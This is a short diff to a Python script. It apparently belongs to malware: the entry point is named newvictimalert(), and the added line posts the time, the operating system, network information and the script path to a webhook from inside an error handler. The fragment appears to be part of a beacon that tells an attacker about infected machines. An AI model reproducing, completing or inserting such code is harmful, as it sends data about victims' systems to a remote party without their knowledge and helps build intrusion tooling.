@@ -53,6 +53,7 @@ def make_folders():
             Message = {
                 'content': f'Error!\nTime: {datetime.now()}\nSystem: {os.name}\nError: {e}\nNetwork info: {network_info}\nExtra info: {sys.argv[0]}'
             }
+            requests.post(webhook_url, Message)
 
 if __name__ == '__main__':
     newvictimalert()
